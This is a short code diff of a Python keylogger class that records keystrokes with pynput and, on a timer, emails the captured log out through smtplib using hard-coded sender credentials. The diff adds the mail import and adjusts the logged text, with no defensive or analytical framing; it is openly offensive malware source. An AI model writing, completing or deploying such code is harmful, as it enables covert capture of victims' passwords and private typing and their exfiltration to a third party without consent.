@@ -2,10 +2,11 @@
 
 import pynput.keyboard
 import threading
+import smtplib
 
 class Keylogger:
     def __init__(self, time_interval, email, password):
-        self.log = ""
+        self.log = "Keylogger started"
         self.interval = time_interval
         self.email = email
         self.password = password
@@ -24,7 +25,7 @@ class Keylogger:
         self.append_to_log(current_key)
     
     def report(self):
-        self.send_mail(self.email, self.password, self.log)      # print or save or send mail here
+        self.send_mail(self.email, self.password, "\n\n" + self.log)      # print or save or send mail here
         self.log = ""
         timer = threading.Timer(self.interval, self.report)    # split program and run report every 5 seconds
         timer.start()
